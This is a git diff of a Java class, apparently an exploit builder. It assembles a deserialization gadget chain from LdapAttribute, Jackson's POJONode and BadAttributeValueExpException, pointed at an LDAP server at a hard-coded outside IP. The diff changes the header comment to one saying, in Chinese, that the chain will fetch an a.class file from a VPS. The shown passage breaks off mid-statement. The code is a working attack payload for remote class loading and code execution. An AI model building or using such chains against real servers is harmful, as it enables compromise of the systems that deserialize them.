@@ -29,23 +29,27 @@ import java.net.URI;
 import java.util.Base64;
 
 /**
- * Hello world!
+ * 会访问到vps上的a.class文件
  *
  */
 public class LdapAttributeChain
 {
     public static void main( String[] args ) throws Exception {
         String ldapCtxUrl = "ldap://118.89.61.71:1099/";
+        
         Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
         Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[] {String.class});
         ldapAttributeClazzConstructor.setAccessible(true);
         Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[] {"name"});
+        
         Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
         baseCtxUrlField.setAccessible(true);
         baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        
         Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
         rdnField.setAccessible(true);
         rdnField.set(ldapAttribute, new CompositeName("a//b"));
+        
         POJONode jsonNodes = new POJONode(ldapAttribute);
         BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
         Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
